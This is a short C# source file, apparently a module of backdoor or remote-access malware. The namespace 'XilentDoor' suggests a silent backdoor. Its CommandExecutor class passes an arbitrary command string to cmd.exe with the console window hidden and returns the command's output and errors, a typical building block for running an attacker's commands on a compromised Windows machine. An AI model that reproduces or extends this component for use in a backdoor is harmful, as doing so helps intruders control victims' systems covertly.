using System.Diagnostics;

namespace XilentDoor.Core
{
    public static class CommandExecutor
    {
        public static string Execute(string command)
        {
            try
            {
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c {command}",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit();
                return output + error;
            }
            catch
            {
                return "[Error al ejecutar comando]";
            }
        }
    }
}
